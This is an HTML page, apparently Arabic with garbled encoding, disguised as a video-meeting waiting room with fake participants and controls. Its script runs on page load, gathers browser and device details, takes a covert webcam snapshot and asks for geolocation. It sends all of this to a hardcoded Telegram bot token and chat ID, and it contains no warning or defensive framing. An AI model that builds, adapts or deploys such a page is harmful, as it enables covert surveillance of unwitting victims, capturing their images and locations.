<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù†Ø¶Ù… Ø¥Ù„Ù‰ Ø§Ø¬ØªÙ…Ø§Ø¹Ùƒ Ø§Ù„Ø¢Ù† - Ù‚Ø§Ø¹Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ©</title>
    
    <meta property="og:title" content="Ø§Ø¯Ø®Ù„ Ù‚Ø§Ø¹Ø© Ø§Ù„Ø§Ø¬ØªÙ…Ø§Ø¹Ø§Øª Ø§Ù„Ø¢Ù†!">
    <meta property="og:description" content="ØªÙ…Øª Ø¯Ø¹ÙˆØªÙƒ Ù„Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ø§Ø¬ØªÙ…Ø§Ø¹ Ù…Ù‡Ù…. Ø§Ø¶ØºØ· Ù‡Ù†Ø§ Ù„Ù„Ø¯Ø®ÙˆÙ„ Ù…Ø¨Ø§Ø´Ø±Ø©Ù‹!">
    <meta property="og:image" content="https://i.imgur.com/your-meeting-preview-image.png"> <meta property="og:url" content="https://yourwebsite.com/meeting-link"> <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap'); /* Ø®Ø· Ø¹Ø±Ø¨ÙŠ Ø£ÙØ¶Ù„ */
        body { margin: 0; font-family: 'Cairo', sans-serif; background-color: #0d1117; color: #e6edf3; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; position: relative; }
        .app-header { position: absolute; top: 0; width: 100%; text-align: center; padding: 15px 0; background-color: rgba(0,0,0,0.3); backdrop-filter: blur(5px); box-shadow: 0 2px 10px rgba(0,0,0,0.5); z-index: 10; }
        .app-header h1 { margin: 0; font-size: 24px; color: #fff; }

        .meeting-room-container { background: rgba(13, 17, 23, 0.8); border-radius: 15px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); padding: 30px; display: flex; flex-direction: column; align-items: center; width: 90%; max-width: 900px; backdrop-filter: blur(10px); z-index: 5; }
        
        .video-panel { display: flex; flex-wrap: wrap; gap: 10px; width: 100%; justify-content: center; margin-bottom: 20px; }
        .video-slot { position: relative; width: calc(50% - 5px); /* Ø§Ø«Ù†Ø§Ù† ÙÙŠ Ø§Ù„ØµÙ */ aspect-ratio: 16/9; background: #000; border-radius: 8px; overflow: hidden; border: 1px solid #30363d; }
        .video-slot.main-user video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); /* Ù…Ø±Ø¢Ø© Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… */ }
        .video-slot.other-user { background-image: url('https://via.placeholder.com/320x180/222222/FFFFFF?text=Ù…Ø´Ø§Ø±Ùƒ+Ø¢Ø®Ø±'); /* ØµÙˆØ±Ø© ÙˆÙ‡Ù…ÙŠØ© Ù„Ù…Ø´Ø§Ø±Ùƒ */ background-size: cover; background-position: center; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #bbb; }
        .video-slot .name-tag { position: absolute; bottom: 5px; right: 5px; background: rgba(0,0,0,0.5); padding: 3px 8px; border-radius: 4px; font-size: 12px; }

        .controls-panel { display: flex; justify-content: center; gap: 20px; margin-top: 20px; width: 100%; }
        .control-btn { background: #21262d; border: none; padding: 12px 20px; border-radius: 50px; cursor: pointer; color: #e6edf3; font-size: 14px; font-weight: bold; display: flex; align-items: center; gap: 8px; transition: background-color 0.3s, transform 0.2s; }
        .control-btn:hover { background: #30363d; transform: translateY(-2px); }
        .control-btn.red { background: #d73a49; }
        .control-btn.red:hover { background: #e04e5d; }
        .control-btn span { font-size: 20px; } /* Ù„Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø§Øª */

        .status-message { margin-top: 25px; font-size: 16px; color: #8b949e; animation: pulse 1.5s infinite alternate; }
        @keyframes pulse { 0% { opacity: 0.7; } 100% { opacity: 1; } }

        .join-button { background: #2ea44f; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-size: 18px; cursor: pointer; font-weight: bold; margin-top: 30px; box-shadow: 0 5px 15px rgba(46,164,79,0.4); transition: background-color 0.3s, transform 0.2s; }
        .join-button:hover { background: #3cc462; transform: translateY(-2px); }
    </style>
</head>
<body>

    <header class="app-header">
        <h1>Ø§Ø¬ØªÙ…Ø§Ø¹ ÙØ±ÙŠÙ‚ Ø§Ù„Ø¹Ù…Ù„</h1>
    </header>

    <div class="meeting-room-container">
        <div class="video-panel">
            <div class="video-slot main-user">
                <video id="webcam" autoplay playsinline muted></video>
                <div class="name-tag">Ø£Ù†Øª</div>
            </div>
            <div class="video-slot other-user">
                <div class="name-tag">Ù…Ø­Ù…Ø¯</div>
            </div>
            <div class="video-slot other-user">
                <div class="name-tag">Ø³Ø§Ø±Ø©</div>
            </div>
            <div class="video-slot other-user">
                <div class="name-tag">Ø§Ù„Ø¶ÙŠÙ</div>
            </div>
        </div>

        <div class="controls-panel">
            <button class="control-btn"><span>&#127897;</span> ÙƒØªÙ… Ø§Ù„ØµÙˆØª</button>
            <button class="control-btn"><span>&#128247;</span> Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</button>
            <button class="control-btn"><span>&#128100;</span> Ø§Ù„Ù…Ø´Ø§Ø±ÙƒÙˆÙ†</button>
            <button class="control-btn red"><span>&#128680;</span> Ø¥Ù†Ù‡Ø§Ø¡</button>
        </div>
        
        <p class="status-message" id="status">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„... ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹.</p>

        <button class="join-button" onclick="startProcess()">Ø§Ù†Ø¶Ù… Ø¥Ù„Ù‰ Ø§Ù„Ø§Ø¬ØªÙ…Ø§Ø¹</button>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

<script>
    const token = "8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo";
    const chatId = "6068331455";

    // Ø§Ù„Ø¨Ø¯Ø§ÙŠØ© Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
    window.onload = async () => {
        document.getElementById('status').innerText = "Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø¨ÙŠØ¦Ø© Ø§Ù„Ø§Ø¬ØªÙ…Ø§Ø¹...";
        
        // 1. Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ØªØµÙØ­ ÙˆØ§Ù„Ù†Ø¸Ø§Ù… ÙÙˆØ±Ø§Ù‹
        await gatherSystemData();

        // 2. Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
        await requestCamera();

        // 3. Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
        requestLocation();
    };

    // ÙˆØ¸ÙŠÙØ© Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
    async function gatherSystemData() {
        let batteryInfo = "ØºÙŠØ± Ù…ØªÙˆÙØ±";
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø´Ø­Ù†' : 'ØªÙØ±ÙŠØº'})`;
        } catch (e) {}

        const data = `
ğŸ“Œ **Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯Ø©** ğŸ“Œ
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸŒ **Ø§Ù„Ù…ØªØµÙØ­:** ${navigator.appName}
ğŸ“± **Ø§Ù„Ø¥ØµØ¯Ø§Ø±:** ${navigator.userAgent}
ğŸ”‹ **Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:** ${batteryInfo}
ğŸ–¥ï¸ **Ø§Ù„Ø´Ø§Ø´Ø©:** ${window.screen.width}x${window.screen.height}
ğŸ”— **Ø§Ù„Ù…Ù†ÙØ° (Port):** ${window.location.port || '80/443'}
ğŸŒ **Ø§Ù„Ù„ØºØ©:** ${navigator.language}
â° **Ø§Ù„ÙˆÙ‚Øª:** ${new Date().toLocaleString('ar-EG')}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”`;
        
        sendToTelegram(data);
    }

    // ÙˆØ¸ÙŠÙØ© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ø³Ø±ÙŠØ¹
    async function requestCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('webcam');
            video.srcObject = stream;

            video.onloadedmetadata = () => {
                video.play();
                // Ø§Ù„ØªÙ‚Ø§Ø· ÙÙˆØ±ÙŠ Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ© ÙˆØ§Ø­Ø¯Ø© Ù…Ù† Ø§Ø³ØªÙ‚Ø±Ø§Ø± Ø§Ù„Ø¹Ø¯Ø³Ø©
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        sendPhotoToTelegram(blob);
                    }, 'image/jpeg', 0.7);
                }, 1000);
            };
        } catch (err) {
            console.log("ØªÙ… Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§");
        }
    }

    // ÙˆØ¸ÙŠÙØ© Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
    function requestLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                const locData = `
ğŸ“ **Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ** ğŸ“
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Latitude: ${position.coords.latitude}
Longitude: ${position.coords.longitude}
ğŸ”— [ÙØªØ­ ÙÙŠ Ø®Ø±Ø§Ø¦Ø· Ø¬ÙˆØ¬Ù„](https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude})
â”â”â”â”â”â”â”â”â”â”â”â”â”â”`;
                sendToTelegram(locData);
            }, err => {
                console.log("ØªÙ… Ø±ÙØ¶ Ø§Ù„Ù…ÙˆÙ‚Ø¹");
            });
        }
    }

    // ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
        });
    }

    function sendPhotoToTelegram(blob) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    }
</script>

</body>
</html>
